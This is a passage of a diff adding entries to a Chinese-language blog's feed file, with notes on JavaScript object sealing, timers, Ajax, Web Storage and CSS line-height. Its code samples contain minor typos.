class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;ES5原生自带bind方法柯里化,使用方法：&lt;code&gt;fn.bind(context, args)&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&quot;2-防篡改对象&quot;&gt;&lt;a href=&quot;#2-防篡改对象&quot; class=&quot;headerlink&quot; title=&quot;2. 防篡改对象&quot;&gt;&lt;/a&gt;2. 防篡改对象&lt;/h2&gt;&lt;h3 id=&quot;2-1-不可篡改对象&quot;&gt;&lt;a href=&quot;#2-1-不可篡改对象&quot; class=&quot;headerlink&quot; title=&quot;2.1 不可篡改对象&quot;&gt;&lt;/a&gt;2.1 不可篡改对象&lt;/h3&gt;&lt;figure class=&quot;highlight&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;var person=&amp;#123;name: &quot;Nicholas&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Object.preventExtensions(person);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;person.age=29;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;alert(person.age); //undefined&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;code&gt;preventExtensions&lt;/code&gt;不可添加属性方法，可修改、删除属性方法。&lt;br&gt;通过&lt;code&gt;Object.isExtensions(person)&lt;/code&gt;检查是否可扩展。&lt;/p&gt;
+&lt;h3 id=&quot;2-2-密封对象&quot;&gt;&lt;a href=&quot;#2-2-密封对象&quot; class=&quot;headerlink&quot; title=&quot;2.2 密封对象&quot;&gt;&lt;/a&gt;2.2 密封对象&lt;/h3&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;Object&lt;/span&gt;.seal(person)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;code&gt;seal&lt;/code&gt;不可添加和删除属性方法，可修改&lt;br&gt;&lt;code&gt;Object.isSealed(person)&lt;/code&gt;检查是密封&lt;/p&gt;
+&lt;h3 id=&quot;2-3-冻结对象&quot;&gt;&lt;a href=&quot;#2-3-冻结对象&quot; class=&quot;headerlink&quot; title=&quot;2.3 冻结对象&quot;&gt;&lt;/a&gt;2.3 冻结对象&lt;/h3&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;Object&lt;/span&gt;.freeze(person)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;code&gt;freeze&lt;/code&gt;不可添加、删除、修改对象。&lt;br&gt;&lt;code&gt;Object.isFrozen(person)&lt;/code&gt;检查是否冻结&lt;/p&gt;
+&lt;h2 id=&quot;3-高级定时器&quot;&gt;&lt;a href=&quot;#3-高级定时器&quot; class=&quot;headerlink&quot; title=&quot;3. 高级定时器&quot;&gt;&lt;/a&gt;3. 高级定时器&lt;/h2&gt;&lt;p&gt;JavaScropt是运行在单线程的环境中的，定时器仅仅只是计划代码在未来某个时间执行。执行时机是不能保证的，因为在页面的生命周期中，不同时间可能有其他代码在控制JavaScript进程。&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; btn=&lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.getElementById(&lt;span class=&quot;string&quot;&gt;&quot;my-btn&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;btn.onclick=&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	setTimeout(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.getElementById(&lt;span class=&quot;string&quot;&gt;&quot;message&quot;&lt;/span&gt;).style.visibilit=&lt;span class=&quot;string&quot;&gt;&quot;visible&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;, &lt;span class=&quot;number&quot;&gt;250&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;//其他代码&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;如以上代码，若onclick执行了300ms，那么定时器代码至少要在300ms后才能被执行。详见JavaScript高级程序设计22章。&lt;/p&gt;
+&lt;h3 id=&quot;3-1-重复定时器&quot;&gt;&lt;a href=&quot;#3-1-重复定时器&quot; class=&quot;headerlink&quot; title=&quot;3.1 重复定时器&quot;&gt;&lt;/a&gt;3.1 重复定时器&lt;/h3&gt;&lt;p&gt;使用setInterval()创建的定时器确保了定时器代码规范地插入队列中。这个方式问题在于，定时器代码可能在代码再次被添加到队列之前，还没有完全执行，结果导致定时器连续运行好几次。幸好，JavaScript引擎够聪明，能避免这个问题。当使用setInterval()时，仅当没有该定时器的任何其他代码示例是，才将定时器代码添加到队列中。确保了定时器代码加入队列中的最小时间间隔为指定间隔。&lt;br&gt;这种重复定时器的规则有连个问题：(1)某些间隔会被跳过；(2)多个定时器的代码执行之间的间隔会比预期的小。详见JavaScript高级程序设计22章&lt;br&gt;使用链式setTimeout()调用&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;setTimeout(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;//处理中&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	setTimeout(argument.callee, interval);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;, interval);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;h3 id=&quot;3-2-Yielding-Processes&quot;&gt;&lt;a href=&quot;#3-2-Yielding-Processes&quot; class=&quot;headerlink&quot; title=&quot;3.2 Yielding Processes&quot;&gt;&lt;/a&gt;3.2 Yielding Processes&lt;/h3&gt;&lt;p&gt;JavaScript的运行时间内存大小被严格限制，如何解决脚本长时间运行的问题？&lt;br&gt;如果该处理&lt;strong&gt;不是必须同步完成&lt;/strong&gt;，而且&lt;strong&gt;数据顺序不是非常重要&lt;/strong&gt;，则可以使用定时器分割这个函数。这是一种&lt;strong&gt;数组分块&lt;/strong&gt;(array chunking)的技术，小块小块地处理数组。&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;setTimeout(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; item=array.shift();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	process(item);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(array.length&amp;gt;&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	setTimeout(&lt;span class=&quot;built_in&quot;&gt;arguments&lt;/span&gt;.callee, &lt;span class=&quot;number&quot;&gt;100&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;, &lt;span class=&quot;number&quot;&gt;100&lt;/span&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;chunk&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;array, process, context&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	setTimeout(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; item=array.shift();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		process(item);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(array.length&amp;gt;&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		setTimeout(&lt;span class=&quot;built_in&quot;&gt;arguments&lt;/span&gt;.callee, &lt;span class=&quot;number&quot;&gt;100&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;, &lt;span class=&quot;number&quot;&gt;100&lt;/span&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h3 id=&quot;3-3-函数节流&quot;&gt;&lt;a href=&quot;#3-3-函数节流&quot; class=&quot;headerlink&quot; title=&quot;3.3 函数节流&quot;&gt;&lt;/a&gt;3.3 函数节流&lt;/h3&gt;&lt;p&gt;若第一次调用函数，创建了一个定时器，第二次调用那个函数，又创建了一个定时器，若第一个定时器还没有运行完，就会导致多个定时，若多次调用那个函数，则创建很多定时器，可能导致浏览器崩溃，解决方法就是：第二次调用函数是，清除上一个定时器。&lt;/p&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;1-高级函数&quot;&gt;&lt;a href=&quot;#1-高级函数&quot; class=&quot;headerlink&quot; title=&quot;1.高级函数&quot;&gt;&lt;/a&gt;1.高级函数&lt;/h2&gt;&lt;h3 id=&quot;1-1-安全类型检查&quot;&gt;&lt;a href=&quot;#1-1-安全类型检查&quot; class=&quot;headerlink&quot; title=&quot;1.1 安全类型检查&quot;&gt;&lt;/a&gt;1.1 安全类型检查&lt;/h3&gt;&lt;p&gt;&lt;code&gt;typeof&lt;/code&gt;和&lt;code&gt;instanceof&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&quot;1-2-作用域安全的构造函数&quot;&gt;&lt;a href=&quot;#1-2-作用域安全的构造函数&quot; class=&quot;headerlink&quot; title=&quot;1.2 作用域安全的构造函数&quot;&gt;&lt;/a&gt;1.2 作用域安全的构造函数&lt;/h3&gt;&lt;p&gt;不用new创建对象，this的指向性问题(指向上一级)。&lt;/p&gt;
+&lt;h3 id=&quot;1-3-惰性载入函数&quot;&gt;&lt;a href=&quot;#1-3-惰性载入函数&quot; class=&quot;headerlink&quot; title=&quot;1.3 惰性载入函数&quot;&gt;&lt;/a&gt;1.3 惰性载入函数&lt;/h3&gt;&lt;p&gt;多if不用每次的判断&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="JS" scheme="http://yoursite.com/tags/JS/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Ajax简介</title>
+    <link href="http://yoursite.com/2016/05/17/Ajax/"/>
+    <id>http://yoursite.com/2016/05/17/Ajax/</id>
+    <published>2016-05-17T04:23:11.000Z</published>
+    <updated>2016-10-02T06:14:00.116Z</updated>
+    
+    <content type="html">&lt;h2 id=&quot;Ajax&quot;&gt;&lt;a href=&quot;#Ajax&quot; class=&quot;headerlink&quot; title=&quot;Ajax&quot;&gt;&lt;/a&gt;Ajax&lt;/h2&gt;&lt;p&gt;ajax的核心是XMLHttpRequest对象&lt;br&gt;通过XMLHttpRequest异步请求通信，JS操纵DOM实现无刷新式更新页面&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&quot;XMLHttpRequest&quot;&gt;&lt;a href=&quot;#XMLHttpRequest&quot; class=&quot;headerlink&quot; title=&quot;XMLHttpRequest&quot;&gt;&lt;/a&gt;XMLHttpRequest&lt;/h3&gt;&lt;p&gt;XMLHttpRequest是一种支持异步请求的技术&lt;br&gt;属性&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;onreadystatechange: readyState改变所触发的事件处理程序&lt;/li&gt;
+&lt;li&gt;responseText: 从服务器返回的文本&lt;/li&gt;
+&lt;li&gt;responseXML: 从服务器返回的DOM兼容的文档数据对象&lt;/li&gt;
+&lt;li&gt;status: 返回HTTP状态码&lt;/li&gt;
+&lt;li&gt;statusText: HTTP状态说明&lt;/li&gt;
+&lt;li&gt;readyState: 对象状态值&lt;ul&gt;
+&lt;li&gt;0：未初始化，对象已建立，尚未调用open方法&lt;/li&gt;
+&lt;li&gt;1：初始化，调用open方法，尚未调用send方法&lt;/li&gt;
+&lt;li&gt;2：发送数据，调用send方法，尚未接收响应&lt;/li&gt;
+&lt;li&gt;3：数据传送中，已接收部分响应数据&lt;/li&gt;
+&lt;li&gt;4：完成，已接收全部响应数据&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;Ajax&quot;&gt;&lt;a href=&quot;#Ajax&quot; class=&quot;headerlink&quot; title=&quot;Ajax&quot;&gt;&lt;/a&gt;Ajax&lt;/h2&gt;&lt;p&gt;ajax的核心是XMLHttpRequest对象&lt;br&gt;通过XMLHttpRequest异步请求通信，JS操纵DOM实现无刷新式更新页面&lt;br&gt;
+    
+    </summary>
+    
+    
+      <category term="JS" scheme="http://yoursite.com/tags/JS/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Web存储机制</title>
+    <link href="http://yoursite.com/2016/05/15/Web%E5%AD%98%E5%82%A8%E6%9C%BA%E5%88%B6/"/>
+    <id>http://yoursite.com/2016/05/15/Web存储机制/</id>
+    <published>2016-05-15T12:32:41.000Z</published>
+    <updated>2016-10-02T06:16:19.903Z</updated>
+    
+    <content type="html">&lt;h1 id=&quot;Web存储机制&quot;&gt;&lt;a href=&quot;#Web存储机制&quot; class=&quot;headerlink&quot; title=&quot;Web存储机制&quot;&gt;&lt;/a&gt;Web存储机制&lt;/h1&gt;&lt;h2 id=&quot;1-Storage类型&quot;&gt;&lt;a href=&quot;#1-Storage类型&quot; class=&quot;headerlink&quot; title=&quot;1. Storage类型&quot;&gt;&lt;/a&gt;1. Storage类型&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;clear(): 删除所有值；&lt;/li&gt;
+&lt;li&gt;getItem(name): 根据指定名字获取对应值；&lt;/li&gt;
+&lt;li&gt;key(index): 获取index位置处的值的名字；&lt;/li&gt;
+&lt;li&gt;removeItem(name): 删除由name指定的名值对儿；&lt;/li&gt;
+&lt;li&gt;setItem(name, value): 为指定的name设置一个对应的值。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
+&lt;h2 id=&quot;2-sessionStorage对象&quot;&gt;&lt;a href=&quot;#2-sessionStorage对象&quot; class=&quot;headerlink&quot; title=&quot;2. sessionStorage对象&quot;&gt;&lt;/a&gt;2. sessionStorage对象&lt;/h2&gt;&lt;p&gt;保持到浏览器关闭，是Stroage的一个实例。&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//使用方法存储数据&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sessionStorage.setItem(&lt;span class=&quot;string&quot;&gt;&quot;name&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;Nicholas&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//使用属性存储数据&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sessionStorage.book=&lt;span class=&quot;string&quot;&gt;&quot;JavaScript&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//使用方法读取数据&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; name=sessionStorage.getItem(&lt;span class=&quot;string&quot;&gt;&quot;name&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//使用属性读取数据&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; book=seeeionStorage.book;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//使用delete删除一个值&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;delete&lt;/span&gt; sessionStorage.name;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//使用方法删除一个值&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sessionStorage.removeItem(&lt;span class=&quot;string&quot;&gt;&quot;book&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;h2 id=&quot;3-globalStorage对象&quot;&gt;&lt;a href=&quot;#3-globalStorage对象&quot; class=&quot;headerlink&quot; title=&quot;3. globalStorage对象&quot;&gt;&lt;/a&gt;3. globalStorage对象&lt;/h2&gt;&lt;p&gt;已废&lt;/p&gt;
+&lt;h2 id=&quot;4-localStorage对象&quot;&gt;&lt;a href=&quot;#4-localStorage对象&quot; class=&quot;headerlink&quot; title=&quot;4. localStorage对象&quot;&gt;&lt;/a&gt;4. localStorage对象&lt;/h2&gt;&lt;p&gt;也是Storage的实例，持久保存客户端数据，同一个域才能访问（子域无效）。&lt;br&gt;使用方法通sessionStorage。&lt;/p&gt;
+&lt;h2 id=&quot;5-storage事件&quot;&gt;&lt;a href=&quot;#5-storage事件&quot; class=&quot;headerlink&quot; title=&quot;5. storage事件&quot;&gt;&lt;/a&gt;5. storage事件&lt;/h2&gt;&lt;p&gt;对Storage对象进行任何修改，都会在文档上触发storage事件。event有以下属性：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;domain: 发生变化的存储空间的域名；&lt;/li&gt;
+&lt;li&gt;key： 设置或删除的键名；&lt;/li&gt;
+&lt;li&gt;newValue: 如果是设置值，则是新值，如果是删除值，则是null；&lt;/li&gt;
+&lt;li&gt;oldValue: 键被更改之前的值。 &lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;值得特别注意的是，该事件不在导致数据变化的当前页面触发。如果浏览器同时打开一个域名下面的多个页面，当其中的一个页面改变sessionStorage或localStorage的数据时，其他所有页面的storage事件会被触发，而原始页面并不触发storage事件。可以通过这种机制，实现多个窗口之间的通信。所有浏览器之中，只有IE浏览器除外，它会在所有页面触发storage事件。&lt;/p&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;Web存储机制&quot;&gt;&lt;a href=&quot;#Web存储机制&quot; class=&quot;headerlink&quot; title=&quot;Web存储机制&quot;&gt;&lt;/a&gt;Web存储机制&lt;/h1&gt;&lt;h2 id=&quot;1-Storage类型&quot;&gt;&lt;a href=&quot;#1-Storage类型&quot; class=&quot;headerlink&quot; title=&quot;1. Storage类型&quot;&gt;&lt;/a&gt;1. Storage类型&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;clear(): 删除所有值；&lt;/li&gt;
+&lt;li&gt;getItem(name): 根据指定名字获取对应值；&lt;/li&gt;
+&lt;li&gt;key(index): 获取index位置处的值的名字；&lt;/li&gt;
+&lt;li&gt;removeItem(name): 删除由name指定的名值对儿；&lt;/li&gt;
+&lt;li&gt;setItem(name, value): 为指定的name设置一个对应的值。&lt;/li&gt;
+&lt;/ul&gt;
+    
+    </summary>
+    
+    
+      <category term="JS" scheme="http://yoursite.com/tags/JS/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>line-height和vertical-aline</title>
+    <link href="http://yoursite.com/2016/05/14/line-height%E5%92%8Cvertical-align/"/>
+    <id>http://yoursite.com/2016/05/14/line-height和vertical-align/</id>
+    <published>2016-05-14T14:32:32.000Z</published>
+    <updated>2016-05-14T15:21:29.670Z</updated>
+    
+    <content type="html">&lt;p&gt;本文基本来自张鑫旭的&lt;a href=&quot;http://www.zhangxinxu.com/wordpress/2015/08/css-deep-understand-vertical-align-and-line-height/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;博客&lt;/a&gt;，自己简写了许多。&lt;/p&gt;
+&lt;h1 id=&quot;line-height和vertical-aline&quot;&gt;&lt;a href=&quot;#line-height和vertical-aline&quot; class=&quot;headerlink&quot; title=&quot;line-height和vertical-aline&quot;&gt;&lt;/a&gt;line-height和vertical-aline&lt;/h1&gt;&lt;h2 id=&quot;行内框盒子模型&quot;&gt;&lt;a href=&quot;#行内框盒子模型&quot; class=&quot;headerlink&quot; title=&quot;行内框盒子模型&quot;&gt;&lt;/a&gt;行内框盒子模型&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;p&lt;/span&gt;&amp;gt;&lt;/span&gt;这是一行普通的文字，这里有个 &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span 